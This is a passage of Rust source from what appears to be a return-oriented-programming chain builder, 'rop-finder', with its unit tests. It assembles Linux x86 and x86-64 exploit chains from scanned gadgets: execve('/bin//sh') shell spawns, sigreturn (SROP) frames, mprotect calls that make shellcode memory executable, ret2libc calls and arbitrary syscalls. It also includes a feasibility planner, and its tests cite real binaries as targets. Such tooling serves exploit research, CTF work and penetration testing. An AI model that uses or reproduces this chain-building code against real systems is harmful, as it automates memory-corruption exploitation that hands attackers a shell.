        LinuxTarget::Srop => {
            if arch != Arch::X64 {
                return Err(ChainError::Unsupported {
                    arch: arch_name(arch),
                    format: "elf (linux-srop is x86-64 only: the i386 sigcontext layout is a \
                             different structure and is not modelled)"
                        .to_string(),
                });
            }
            // The frame's own syscall. Default: execve("/bin//sh", 0, 0),
            // which is why the path write is still required; with
            // --syscall the frame carries that call instead and no write
            // is needed.
            let (nr, args, mem, what) = match opts.syscall_nr {
                Some(nr) => (
                    nr,
                    opts.syscall_args.clone(),
                    Vec::new(),
                    format!("syscall {nr}"),
                ),
                None => (
                    abi.nr_execve,
                    vec![
                        ("rdi".to_string(), data),
                        ("rsi".to_string(), 0),
                        ("rdx".to_string(), 0),
                    ],
                    path_writes(data, 8),
                    "execve(\"/bin//sh\", NULL, NULL)".to_string(),
                ),
            };
            let frame = srop64_frame(nr, &args, trap_vaddr, stack_hint);
            Ok(Goal {
                description: format!(
                    "Linux SROP: rt_sigreturn restores a sigcontext that runs {what} \
                     -- needs only `pop {}` and `{}`, not one pop per argument",
                    abi.nr_reg, abi.trap
                ),
                script_comment: "# SROP chain (rop-finder)".to_string(),
                mem,
                regs: vec![RegPost {
                    reg: abi.nr_reg.to_string(),
                    value: NR_RT_SIGRETURN64,
                    kind: dk,
                    comment: format!("{} = {NR_RT_SIGRETURN64} (__NR_rt_sigreturn)", abi.nr_reg),
                    ladder: true,
                }],
                exit: Exit::Sigreturn { frame },
            })
        }
    }
}

/// Page size assumed for `mprotect`'s alignment requirement. Every Linux
/// target this builder supports uses 4 KiB pages.
const PAGE_SIZE: u64 = 0x1000;

/// `PROT_*` as a readable label; unknown combinations render as hex.
fn prot_label(v: u64) -> String {
    let names = [(1u64, "PROT_READ"), (2, "PROT_WRITE"), (4, "PROT_EXEC")];
    if v == 0 {
        return "PROT_NONE".to_string();
    }
    if v & !7 != 0 {
        return format!("{v:#x}");
    }
    names
        .iter()
        .filter(|(bit, _)| v & bit != 0)
        .map(|(_, n)| *n)
        .collect::<Vec<_>>()
        .join("|")
}

/// Build a Linux ROP chain for any of the [`LinuxTarget`]s (`ECO-04`,
/// `CHLX-07`).
///
/// `build_linux_execve` is this function with
/// `LinuxChainOpts::default()`; its signature is unchanged so every
/// existing caller keeps working.
pub fn build_linux(
    gadgets: &[Gadget],
    data_sections: &[DataSection],
    arch: Arch,
    format: &str,
    badbytes: &[u8],
    opts: &LinuxChainOpts,
) -> Result<RopChain, ChainError> {
    if format != "elf" || !matches!(arch, Arch::X86 | Arch::X64) {
        return Err(ChainError::Unsupported {
            arch: arch_name(arch),
            format: format.to_string(),
        });
    }
    let abi = abi_of(arch);
    let word = abi.word;
    for (reg, _) in &opts.syscall_args {
        if !abi.args.iter().any(|a| a.eq_ignore_ascii_case(reg)) {
            return Err(ChainError::MissingGadget(format!(
                "--syscall-args: {reg:?} is not a Linux/{} syscall argument register; \
                 the ABI passes them in {}",
                arch_name(arch),
                abi.args.join(", ")
            )));
        }
    }

    // Every caller-supplied constant has to FIT the chain's word. A 64-bit
    // libc address on an x86 target used to be packed anyway and produced a
    // JSON IR whose word did not fit its own `word_size` (the same class of
    // defect as the unmasked alternative padding constant CHLX-03 hit).
    let mask = if word >= 8 {
        u64::MAX
    } else {
        (1u64 << (word * 8)) - 1
    };
    let fits = |label: &str, v: u64| -> Result<(), ChainError> {
        if v & !mask != 0 {
            return Err(ChainError::MissingGadget(format!(
                "{label} {v:#x} does not fit this target's {word}-byte word"
            )));
        }
        Ok(())
    };
    for (label, v) in [
        ("--api-addr", opts.func_addr),
        ("--shellcode-addr", opts.shellcode_addr),
    ]
    .into_iter()
    .filter_map(|(l, v)| v.map(|v| (l, v)))
    {
        fits(label, v)?;
    }
    fits("--shellcode-size", opts.shellcode_size)?;
    fits("--prot", opts.prot)?;
    for (reg, v) in &opts.syscall_args {
        fits(&format!("--syscall-args {reg}="), *v)?;
    }

    let windows = usable_write_windows(data_sections);
    let needs_write = opts.target.needs_write_primitive();
    if windows.is_empty() && needs_write {
        return Err(ChainError::NoWritableSection);
    }

    let anas = analyse(gadgets, arch, word);
    let universe = RopChain::universe_from(gadgets);
    let default_pad = if arch == Arch::X64 {
        PADDING64
    } else {
        PADDING32
    };
    let need = if arch == Arch::X64 { 16 } else { 12 };

    // The frame's rip is the trap gadget's own address, so SROP has to
    // know it before the goal is built.
    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();
    let trap_vaddr = find_exact(&rev, abi.trap).map(|g| g.vaddr).unwrap_or(0);

    let attempts = if windows.is_empty() {
        vec![(0u64, default_pad)]
    } else {
        write_attempts(&windows, badbytes, word, need, default_pad)
    };

    let mut first_err: Option<ChainError> = None;
    for (data, pad) in attempts {
        // A restored rsp must be writable. Keep it inside the same window
        // when the window has room, else just past the chain's own writes.
        let stack_hint = windows
            .iter()
            .find(|w| w.base <= data && (w.end > data || w.end == w.base))
            .map(|w| {
                if w.end > data + 0x100 {
                    data + 0x100
                } else {
                    data + need
                }
            })
            .unwrap_or(data + need);
        let goal = goal_for(abi, arch, opts, data, stack_hint, trap_vaddr)?;
        let ctx = Ctx {
            anas: &anas,
            gadgets,
            word,
            badbytes,
        };
        let b = match synthesize(&ctx, abi, &goal, pad) {
            Ok(b) => b,
            Err(e) => {
                first_err.get_or_insert(e);
                continue;
            }
        };
        let chain = RopChain {
            arch: arch_name(arch),
            description: goal.description.clone(),
            script_comment: goal.script_comment.clone(),
            word_size: word,
            words: b.words,
            gadgets: b.gadgets,
        };
        match chain.validate(&universe, badbytes) {
            Ok(()) => return Ok(chain),
            Err(e) => {
                first_err.get_or_insert(e);
            }
        }
    }
    Err(first_err.unwrap_or(ChainError::NoWritableSection))
}

// ---------------------------------------------------------------------------
// ECO-04: the Linux feasibility probe
// ---------------------------------------------------------------------------

/// How many gadgets `find_exact` would accept for `something` (it returns
/// the first; the plan reports how many there were).
pub(crate) fn count_exact(gadgets_rev: &[&Gadget], something: &str) -> usize {
    let forms = wanted_forms(something);
    gadgets_rev
        .iter()
        .filter(|g| forms.contains(&insns(g)[0]) && clean_tail(g))
        .count()
}

/// The strategies [`plan_set_reg`] tries for one register, with the number
/// of gadgets in THIS scan that each one has to work with.
///
/// The counts come from the same models the planner selects over, so they
/// are counts of USABLE candidates, not of text matches: a gadget with a
/// dirty tail, a dereference the chain cannot set up, or a privileged
/// instruction has no model and is not counted. That makes `candidates: 0`
/// mean "this strategy had nothing to work with", and `candidates: n > 0`
/// with `satisfied: false` mean "the gadgets are there and something else
/// rejected them" -- under `--badbytes`, the value; in a longer chain, a
/// clobber of a register that is already live.
fn set_reg_strategies(ctx: &Ctx<'_>, reg: &str, value: u64, ladder: bool) -> Vec<Strategy> {
    let usable = |f: &dyn Fn(&Model) -> bool| -> usize {
        ctx.anas
            .iter()
            .filter(|a| a.model.as_ref().is_some_and(|m| m.write.is_none() && f(m)))
            .count()
    };
    let rev = ctx.rev();
    let mut out = vec![Strategy::new(
        format!("pop {reg}"),
        usable(&|m| m.slot_of(reg).is_some()),
        format!("{reg} comes off the payload (any gadget with a {reg} pop slot, not only a leading `pop {reg}`)"),
    )];
    if value == 0 {
        out.push(Strategy::new(
            format!("xor {reg}, {reg}"),
            usable(&|m| m.zeroes_reg(reg)),
            format!("a gadget that forces {reg} to zero, costing no payload word"),
        ));
    }
    out.push(Strategy::new(
        format!("mov {reg}, <reg>"),
        usable(&|m| m.moves.iter().any(|(d, _, _)| d.eq_ignore_ascii_case(reg))),
        format!("register transfer: pop an intermediate register, then move it into {reg}"),
    ));
    if ladder {
        out.push(Strategy::new(
            format!("inc {reg}"),
            count_exact(&rev, &format!("inc {reg}")) + count_exact(&rev, &format!("add {reg}, 1")),
            "the oracle's zero-then-increment ladder (CHLX-02's fallback)".to_string(),
        ));
    }
    out
}

/// `ECO-04`: the feasibility report for a Linux target. Never fails.
pub fn plan_linux(
    gadgets: &[Gadget],
    data_sections: &[DataSection],
    arch: Arch,
    format: &str,
    badbytes: &[u8],
    opts: &LinuxChainOpts,
) -> ChainPlan {
    let mut pb = PlanBuilder::new(ChainPlan::new(
        opts.target.as_str(),
        arch_name(arch),
        format,
    ));
    if format != "elf" || !matches!(arch, Arch::X86 | Arch::X64) {
        pb.require(
            "target_supported",
            format!(
                "the Linux chain builders cover ELF x86 and x86-64; this is {} / {format}",
                arch_name(arch)
            ),
            Vec::new(),
            None,
        );
        pb.plan.error = Some(
            ChainError::Unsupported {
                arch: arch_name(arch),
                format: format.to_string(),
            }
            .to_string(),
        );
        return pb.plan;
    }
    let abi = abi_of(arch);
    let word = abi.word;
    let windows = usable_write_windows(data_sections);
    let needs_write = opts.target.needs_write_primitive();
    let need = if arch == Arch::X64 { 16 } else { 12 };
    let default_pad = if arch == Arch::X64 {
        PADDING64
    } else {
        PADDING32
    };
    let attempts = if windows.is_empty() {
        vec![(0u64, default_pad)]
    } else {
        write_attempts(&windows, badbytes, word, need, default_pad)
    };
    let (data, _) = attempts[0];

    if needs_write {
        pb.require(
            "write_target",
            format!(
                "a writable, non-TLS, post-RELRO section with room for {need} bytes of \
                 path + NULL (CHLX-05)"
            ),
            vec![Strategy::new(
                "section: writable && !tls && !relro",
                windows.len(),
                "usable write windows in this image",
            )],
            windows
                .first()
                .map(|w| (data, format!("{} @ {data:#x}", w.name))),
        );
        pb.plan.assumptions.write_target =
            windows.first().map(|w| format!("{} @ {data:#x}", w.name));
    }

    let anas = analyse(gadgets, arch, word);
    let ctx = Ctx {
        anas: &anas,
        gadgets,
        word,
        badbytes,
    };
    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();
    let trap_vaddr = find_exact(&rev, abi.trap).map(|g| g.vaddr).unwrap_or(0);
    let stack_hint = data + need;
    let goal = match goal_for(abi, arch, opts, data, stack_hint, trap_vaddr) {
        Ok(g) => g,
        Err(e) => {
            pb.require(
                "target_parameters",
                "the target's own required parameters".to_string(),
                Vec::new(),
                None,
            );
            pb.plan.error = Some(e.to_string());
            return pb.plan;
        }
    };

    if !goal.mem.is_empty() {
        let writers = writer_candidates(&ctx, abi.regs);
        let any_write = anas
            .iter()
            .filter(|a| a.model.as_ref().is_some_and(|m| m.write.is_some()))
            .count();
        pb.require(
            "write_primitive",
            format!(
                "a write-what-where gadget `{}` whose base and source registers the chain \
                 can populate",
                abi.missing_w4w
            ),
            vec![
                Strategy::new(
                    abi.missing_w4w,
                    any_write,
                    "gadgets whose model contains exactly one memory write",
                ),
                Strategy::new(
                    format!("{} over {{{}}}", abi.missing_w4w, abi.regs.join(", ")),
                    writers.len(),
                    "of those, the ones whose base and source are both chain-controllable",
                ),
            ],
            writers.first().map(|w| (w.g.vaddr, w.g.text())),
        );
    }

    for post in &goal.regs {
        let hit = plan_set_reg(&ctx, &post.reg, post.value, &[], &post.comment, post.kind)
            .and_then(|steps| steps.first().map(|s| (s.g.vaddr, s.g.text())))
            .or_else(|| {
                // CHLX-02's ladder is a real route to a small constant.
                (post.ladder
                    && find_exact(&rev, &format!("xor {}, {}", post.reg, post.reg)).is_some())
                .then(|| {
                    let g = find_exact(&rev, &format!("xor {}, {}", post.reg, post.reg))?;
                    Some((g.vaddr, g.text()))
                })
                .flatten()
            });
        pb.require(
            &format!("set_{}", post.reg),
            format!(
                "{} must hold {:#x} ({})",
                post.reg, post.value, post.comment
            ),
            set_reg_strategies(&ctx, &post.reg, post.value, post.ladder),
            hit,
        );
    }

    match &goal.exit {
        Exit::Trap | Exit::Sigreturn { .. } => {
            let hit = find_exact(&rev, abi.trap).map(|g| (g.vaddr, g.text()));
            pb.require(
                "syscall_trap",
                format!("a `{}` gadget to enter the kernel", abi.trap),
                vec![Strategy::new(
                    abi.trap,
                    count_exact(&rev, abi.trap),
                    "clean-tailed trap gadgets",
                )],
                hit,
            );
        }
        Exit::Code { addr, .. } => {
            pb.require(
                "call_target",
                "a runtime address to transfer control to (--api-addr)".to_string(),
                vec![Strategy::new(
                    "--api-addr",
                    usize::from(*addr != 0),
                    "supplied on the command line; this builder resolves no libc symbols",
                )],
                (*addr != 0).then(|| (0u64, format!("--api-addr {addr:#x}"))),
            );
            pb.plan.assumptions.needs_leak = true;
        }
    }

    match build_linux(gadgets, data_sections, arch, format, badbytes, opts) {
        Ok(chain) => {
            pb.plan.feasible = true;
            pb.plan.word_count = Some(chain.words.len());
        }
        Err(e) => pb.plan.error = Some(e.to_string()),
    }
    pb.plan
}

#[cfg(test)]
mod tests {
    use super::*;

    fn gadget(vaddr: u64, text: &str) -> Gadget {
        Gadget {
            vaddr,
            bytes: Vec::new(),
            insns: text.split(" ; ").map(|s| s.to_string()).collect(),
            delay_slot: false,
            prev: None,
            table: rf_scan::TableKind::Rop,
        }
    }

    fn x64_gadget_set() -> Vec<Gadget> {
        // Minimal sufficient set, vaddr-ascending (reversed during search,
        // so the HIGHEST vaddr of each text wins).
        vec![
            gadget(0x1000, "mov qword ptr [rdi], rsi ; ret"),
            gadget(0x1010, "pop rdi ; ret"),
            gadget(0x1014, "pop rdi ; ret"), // duplicate text, higher vaddr wins
            gadget(0x1020, "pop rsi ; ret"),
            gadget(0x1030, "xor rsi, rsi ; ret"),
            gadget(0x1040, "xor rax, rax ; ret"),
            gadget(0x1050, "inc rax ; ret"),
            gadget(0x1060, "add rax, 1 ; ret"),
            gadget(0x1070, "pop rdx ; ret"),
            gadget(0x1080, "syscall"),
            gadget(0x1090, "pop rbx ; ret 0x6"), // dirty ret — never selected
        ]
    }

    fn x86_gadget_set() -> Vec<Gadget> {
        vec![
            gadget(0x1000, "mov dword ptr [edx], eax ; ret"),
            gadget(0x1010, "pop edx ; ret"),
            gadget(0x1020, "pop eax ; ret"),
            gadget(0x1030, "xor eax, eax ; ret"),
            gadget(0x1040, "inc eax ; ret"),
            gadget(0x1050, "pop ebx ; ret"),
            gadget(0x1060, "pop ecx ; ret"),
            gadget(0x1070, "int 0x80"),
        ]
    }

    fn data() -> Vec<DataSection> {
        vec![
            DataSection {
                name: ".got".into(),
                vaddr: 0x600000,
                writable: true,
            },
            DataSection {
                name: ".data".into(),
                vaddr: 0x6bc080,
                writable: true,
            },
            DataSection {
                name: ".bss".into(),
                vaddr: 0x6bd680,
                writable: true,
            },
        ]
    }

    /// CHLX-04's walk must account for EVERY word: the chain stops at the
    /// `syscall`, which is the last word, so nothing is left over.  A gadget
    /// with an unmodelled stack effect (`add rsp, 0x18`, `leave`, a stack
    /// pivot) would make the walk abstain from there on, which is how a
    /// costly and unverifiable primitive shows up.
    fn assert_fully_accounted(chain: &RopChain) {
        let acc = chain.verify_stack_accounting().unwrap();
        assert_eq!(
            acc.words_verified(),
            chain.words.len(),
            "stack accounting stopped early: {}",
            acc.stop_reason
        );
    }

    fn kinds(chain: &RopChain) -> Vec<WordKind> {
        chain.words.iter().map(|w| w.kind).collect()
    }

    fn gadget_words(chain: &RopChain) -> Vec<&str> {
        chain
            .words
            .iter()
            .filter(|w| w.kind == WordKind::GadgetAddr)
            .map(|w| w.comment.as_str())
            .collect()
    }

    #[test]
    fn reversed_search_prefers_higher_vaddr() {
        let g = x64_gadget_set();
        let rev: Vec<&Gadget> = g.iter().rev().collect();
        let found = find_exact(&rev, "pop rdi").unwrap();
        assert_eq!(found.vaddr, 0x1014, "reversed order picks the last copy");
    }

    #[test]
    fn tail_rule_rejects_ret_with_offset() {
        let g = gadget(0x1, "pop rdi ; ret 0x6");
        assert!(!clean_tail(&g));
        let g = gadget(0x1, "pop rdi ; pop rsi ; ret");
        assert!(clean_tail(&g));
        let g = gadget(0x1, "pop rdi ; add rsp, 8 ; ret");
        assert!(!clean_tail(&g));
    }

    #[test]
    fn x64_chain_structure_and_semantics() {
        let g = x64_gadget_set();
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
        assert_eq!(chain.word_size, 8);

        // popRdi, @.data, popRsi, "/bin//sh", w4w, popRdi, @.data+8, xorRsi,
        // w4w, popRdi, @.data, popRsi, @.data+8, popRdx, @.data+8,
        // popRax, 59, syscall
        assert_eq!(
            kinds(&chain)[..15],
            [
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::Immediate,
                WordKind::GadgetAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::GadgetAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
                WordKind::GadgetAddr,
                WordKind::DataAddr,
            ]
        );
        assert_eq!(chain.words.last().unwrap().comment, "syscall");

        // immediates and data addresses
        assert_eq!(chain.words[3].value, u64::from_le_bytes(*b"/bin//sh"));
        assert_eq!(chain.words[1].value, 0x6bc080);
        assert_eq!(chain.words[6].value, 0x6bc088);

        // the write-what-where gadget is the one from our set
        assert_eq!(chain.words[4].comment, "mov qword ptr [rdi], rsi ; ret");

        // every gadget word references a real gadget
        let universe = RopChain::universe_from(&g);
        chain.validate(&universe, &[]).unwrap();
        assert_fully_accounted(&chain);

        // raw bytes: word 1 is the .data address in LE
        let raw = chain.to_bytes();
        assert_eq!(&raw[8..16], &0x6bc080u64.to_le_bytes());
        assert_eq!(&raw[24..32], b"/bin//sh");
    }

    /// CHLX-02: `pop rax ; ret` is in the gadget set, so the syscall number
    /// costs two words, not sixty. Before the fix this chain was 76 words.
    #[test]
    fn chlx02_syscall_number_uses_pop_rax_when_available() {
        let mut g = x64_gadget_set();
        g.push(gadget(0x1100, "pop rax ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();

        assert!(
            chain.words.len() <= 19,
            "expected a compact chain, got {} words",
            chain.words.len()
        );
        assert_eq!(
            gadget_words(&chain)
                .iter()
                .filter(|t| t.starts_with("inc rax"))
                .count(),
            0,
            "no increment ladder when rax can be popped"
        );
        let fifty_nine = chain
            .words
            .iter()
            .find(|w| w.value == 59 && w.kind == WordKind::DataAddr);
        assert!(
            fifty_nine.is_some(),
            "the syscall number is a popped constant"
        );
        assert_eq!(fifty_nine.unwrap().comment, "rax = 59 (__NR_execve)");
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
        assert_fully_accounted(&chain);
    }

    /// The increment ladder is still there for a binary that cannot pop rax.
    #[test]
    fn chlx02_falls_back_to_the_increment_ladder() {
        let chain = build_linux_execve(&x64_gadget_set(), &data(), Arch::X64, "elf", &[]).unwrap();
        assert_eq!(
            gadget_words(&chain)
                .iter()
                .filter(|t| t.starts_with("inc rax"))
                .count(),
            59
        );
    }

    /// CHLX-01: `pop rdx ; repz ret`. `repz ret` is the AMD-K8 branch-
    /// prediction spelling of a plain near return; the leading-instruction
    /// tail rule rejected it, which is exactly why elf-x64-bash-v4.1.5.1
    /// produced no chain at all.
    #[test]
    fn chlx01_repz_ret_is_a_bare_return() {
        assert!(is_bare_ret("repz ret"));
        assert!(is_bare_ret("rep ret"));
        assert!(is_bare_ret("ret 0"));
        assert!(is_bare_ret("ret"));
        assert!(!is_bare_ret("ret 0x6"));

        let mut g = x64_gadget_set();
        g.retain(|x| x.text() != "pop rdx ; ret");
        // no `pop rdx ; ret` any more — only the repz form
        assert!(build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).is_err());
        g.push(gadget(0x1200, "pop rdx ; repz ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
        assert!(gadget_words(&chain).contains(&"pop rdx ; repz ret"));
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();

        // HANDOFF (lib.rs): `RopChain::verify_stack_accounting` matches the
        // terminator against the literal string "ret", so a `repz ret` makes
        // the walk abstain from that word on.  That is a gap in the verifier,
        // not in the chain — the emulator runs this shape to execve on
        // elf-x64-bash-v4.1.5.1 — and teaching it the two `rep`-prefixed
        // spellings (and `ret 0`) closes it.  Asserted as a lower bound so
        // this test keeps passing once it is closed.
        let i = chain
            .words
            .iter()
            .position(|w| w.comment == "pop rdx ; repz ret")
            .unwrap();
        let acc = chain.verify_stack_accounting().unwrap();
        assert!(
            acc.words_verified() > i,
            "accounted {} of {} words: {}",
            acc.words_verified(),
            chain.words.len(),
            acc.stop_reason
        );
    }

    /// CHLX-01: a `pop` that is not the gadget's first instruction still
    /// sets its register — the payload word simply lands one slot later.
    #[test]
    fn chlx01_pop_in_a_later_slot_is_usable() {
        let mut g = x64_gadget_set();
        g.retain(|x| x.text() != "pop rdx ; ret");
        g.push(gadget(0x1300, "pop rbx ; pop rdx ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();

        let i = chain
            .words
            .iter()
            .position(|w| w.comment == "pop rbx ; pop rdx ; ret")
            .expect("the two-pop gadget was selected");
        // slot 0 is rbx (padding), slot 1 is the rdx value
        assert_eq!(chain.words[i + 1].kind, WordKind::Padding);
        assert_eq!(chain.words[i + 2].value, 0x6bc088);
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
        assert_fully_accounted(&chain);
    }

    /// CHLX-01: no `pop rdx` in any position, but `pop rax ; ret` plus
    /// `mov rdx, rax ; ret` reaches it — the register-transfer fallback the
    /// Windows builder always had and the Linux one never did.
    #[test]
    fn chlx01_register_transfer_reaches_rdx() {
        let mut g = x64_gadget_set();
        g.retain(|x| x.text() != "pop rdx ; ret");
        assert!(build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).is_err());
        g.push(gadget(0x1400, "pop rax ; ret"));
        g.push(gadget(0x1410, "mov rdx, rax ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
        let texts = gadget_words(&chain);
        assert!(texts.contains(&"mov rdx, rax ; ret"));
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
        assert_fully_accounted(&chain);
    }

    /// CHLX-01: a displaced store is a write-what-where primitive too —
    /// `mov qword ptr [rdi + 0x10], rsi` writes to `data` when rdi holds
    /// `data - 0x10`. elf-FreeBSD-x86's only clean stores are displaced.
    #[test]
    fn chlx01_displaced_write_what_where() {
        let mut g = x64_gadget_set();
        g.retain(|x| x.text() != "mov qword ptr [rdi], rsi ; ret");
        assert!(build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).is_err());
        g.push(gadget(0x1500, "mov qword ptr [rdi + 0x10], rsi ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
        assert!(gadget_words(&chain).contains(&"mov qword ptr [rdi + 0x10], rsi ; ret"));
        // rdi is loaded with .data - 0x10 so the store lands on .data
        assert_eq!(chain.words[1].value, 0x6bc080 - 0x10);
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
        assert_fully_accounted(&chain);
    }

    /// CHLX-04-adjacent, and a direct consequence of the planner: a gadget
    /// whose tail pops a register the chain has already set no longer
    /// destroys it with 0x4141…, because every payload slot is filled from
    /// the already-set table.
    #[test]
    fn later_pops_preserve_already_set_registers() {
        let mut g = x64_gadget_set();
        g.retain(|x| x.text() != "pop rdx ; ret");
        g.push(gadget(0x1600, "pop rdx ; pop rdi ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
        let i = chain
            .words
            .iter()
            .position(|w| w.comment == "pop rdx ; pop rdi ; ret")
            .unwrap();
        assert_eq!(chain.words[i + 1].value, 0x6bc088, "rdx");
        assert_eq!(
            chain.words[i + 2].value,
            0x6bc080,
            "rdi is refilled with its own value, not padding"
        );
        assert_eq!(chain.words[i + 2].comment, "padding without overwrite rdi");
    }

    #[test]
    fn x64_backtracks_when_write4where_has_no_pop() {
        let mut g = x64_gadget_set();
        // A HIGHER-vaddr w4w candidate (found first in reversed order)
        // whose dst has no pop gadget → the builder must backtrack to the
        // lower-vaddr [rdi],rsi gadget.
        g.push(gadget(0x3000, "mov qword ptr [r15], r14 ; ret"));
        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
        assert!(chain
            .gadgets
            .iter()
            .any(|gr| gr.text == "mov qword ptr [rdi], rsi ; ret"));
        assert!(!chain
            .gadgets
            .iter()
            .any(|gr| gr.text == "mov qword ptr [r15], r14 ; ret"));
    }

    #[test]
    fn x86_chain_structure() {
        let g = x86_gadget_set();
        let chain = build_linux_execve(&g, &data(), Arch::X86, "elf", &[]).unwrap();
        assert_eq!(chain.word_size, 4);
        let last = chain.words.last().unwrap();
        assert_eq!(last.comment, "int 0x80");
        let imm: Vec<u64> = chain
            .words
            .iter()
            .filter(|w| w.kind == WordKind::Immediate)
            .map(|w| w.value)
            .collect();
        assert_eq!(
            imm,
            vec![
                u32::from_le_bytes(*b"/bin") as u64,
                u32::from_le_bytes(*b"//sh") as u64,
            ],
            "the two path halves; every other word packs as an address"
        );
        // CHLX-02: eax = 11 in one popped word, not eleven `inc eax` gadgets.
        assert!(chain
            .words
            .iter()
            .any(|w| w.value == 11 && w.comment == "eax = 11 (__NR_execve)"));
        assert!(!gadget_words(&chain)
            .iter()
            .any(|t| t.starts_with("inc eax")));
        let universe = RopChain::universe_from(&g);
        chain.validate(&universe, &[]).unwrap();
        assert_fully_accounted(&chain);
    }

    // -- ECO-04 / CHLX-07: the synthesizer and its targets -----------------

    fn opts(target: LinuxTarget) -> LinuxChainOpts {
        LinuxChainOpts {
            target,
            ..LinuxChainOpts::default()
        }
    }

    /// The register-population search is a real search: it tries the
    /// declared order, its reverse, and each register hoisted to the front.
    /// The bound matters — a six-argument `--syscall` must not cost 720
    /// build attempts.
    #[test]
    fn eco04_candidate_orders_are_bounded_and_distinct() {
        assert_eq!(candidate_orders(0), vec![Vec::<usize>::new()]);
        assert_eq!(candidate_orders(1), vec![vec![0]]);
        for n in 2..=6 {
            let orders = candidate_orders(n);
            assert!(orders.len() <= n + 1, "n={n} gave {} orders", orders.len());
            assert_eq!(orders[0], (0..n).collect::<Vec<_>>());
            let mut seen = orders.clone();
            seen.sort();
            seen.dedup();
            assert_eq!(seen.len(), orders.len(), "duplicate order at n={n}");
            for o in &orders {
                let mut s = o.clone();
                s.sort();
                assert_eq!(
                    s,
                    (0..n).collect::<Vec<_>>(),
                    "order {o:?} is not a permutation"
                );
            }
        }
    }

    /// CHLX-07: `linux-mprotect`. The region is page-aligned DOWN and the
    /// length rounded UP, because mprotect requires it — a chain that
    /// passed the raw address through would get EINVAL.
    #[test]
    fn chlx07_mprotect_page_aligns_the_region() {
        let mut g = x64_gadget_set();
        g.push(gadget(0x1100, "pop rax ; ret"));
        let mut o = opts(LinuxTarget::Mprotect);
        o.shellcode_addr = Some(0x6bc123);
        o.shellcode_size = 0x10;
        o.prot = 7;
        let chain = build_linux(&g, &data(), Arch::X64, "elf", &[], &o).unwrap();
        let values: Vec<u64> = chain
            .words
            .iter()
            .filter(|w| w.kind == WordKind::DataAddr)
            .map(|w| w.value)
            .collect();
        assert!(values.contains(&0x6bc000), "page-aligned base: {values:x?}");
        assert!(values.contains(&0x1000), "one page of length: {values:x?}");
        assert!(values.contains(&7), "prot: {values:x?}");
        assert!(values.contains(&10), "__NR_mprotect: {values:x?}");
        assert!(chain.description.contains("PROT_READ|PROT_WRITE|PROT_EXEC"));
        chain.validate(&RopChain::universe_from(&g), &[]).unwrap();
    }

    /// CHLX-07: the generic `--syscall <n>` with explicit argument
    /// registers, and the ABI check that rejects a register that is not
    /// one.
    #[test]
    fn chlx07_generic_syscall_sets_the_declared_registers() {
        let mut g = x64_gadget_set();
        g.push(gadget(0x1100, "pop rax ; ret"));
        let mut o = opts(LinuxTarget::Syscall);
        o.syscall_nr = Some(60);
        o.syscall_args = vec![("rdi".into(), 0x2a)];
        let chain = build_linux(&g, &data(), Arch::X64, "elf", &[], &o).unwrap();
        let values: Vec<u64> = chain.words.iter().map(|w| w.value).collect();
        assert!(values.contains(&60), "the syscall number: {values:x?}");
        assert!(values.contains(&0x2a), "rdi's value: {values:x?}");

        let mut bad = o.clone();
        bad.syscall_args = vec![("r13".into(), 1)];
        let err = build_linux(&g, &data(), Arch::X64, "elf", &[], &bad).unwrap_err();
        assert!(
            err.to_string()
                .contains("not a Linux/x64 syscall argument register"),
            "{err}"
        );

        let mut none = opts(LinuxTarget::Syscall);
        none.syscall_nr = None;
        let err = build_linux(&g, &data(), Arch::X64, "elf", &[], &none).unwrap_err();
        assert!(err.to_string().contains("--syscall <n>"), "{err}");
    }

    /// CHLX-07: `linux-ret2libc`. On x64 the argument goes in rdi; on x86
    /// it goes on the stack after the fake return address, so the x86 chain
    /// needs no argument gadget at all.
    #[test]
    fn chlx07_ret2libc_places_the_argument_per_abi() {
        let mut g = x64_gadget_set();
        let mut o = opts(LinuxTarget::Ret2Libc);
        o.func_addr = Some(0x7fff_0000_1000);
        let chain = build_linux(&g, &data(), Arch::X64, "elf", &[], &o).unwrap();
        let call = chain
            .words
            .iter()
            .find(|w| w.kind == WordKind::CodeAddr)
            .expect("the call word");
        assert_eq!(call.value, 0x7fff_0000_1000);
        g.clear();

        let mut o32 = opts(LinuxTarget::Ret2Libc);
        o32.func_addr = Some(0x0804_9000);
        let chain = build_linux(&x86_gadget_set(), &data(), Arch::X86, "elf", &[], &o32).unwrap();
        let idx = chain
            .words
            .iter()
            .position(|w| w.kind == WordKind::CodeAddr)
            .expect("the call word");
        // return address, then arg1.
        assert_eq!(
            chain.words[idx + 2].value,
            0x6bc080,
            "cdecl arg1 on the stack"
        );
        assert!(chain.words[idx + 2].comment.contains("arg1"));
    }

    /// A constant the caller supplied must FIT the chain's word: a 64-bit
    /// libc address on a 32-bit target used to be packed anyway.
    #[test]
    fn chlx07_a_wide_constant_is_refused_not_truncated() {
        let mut o = opts(LinuxTarget::Ret2Libc);
        o.func_addr = Some(0x7fff_f7a5_2390);
        let err = build_linux(&x86_gadget_set(), &data(), Arch::X86, "elf", &[], &o).unwrap_err();
        assert!(err.to_string().contains("does not fit"), "{err}");
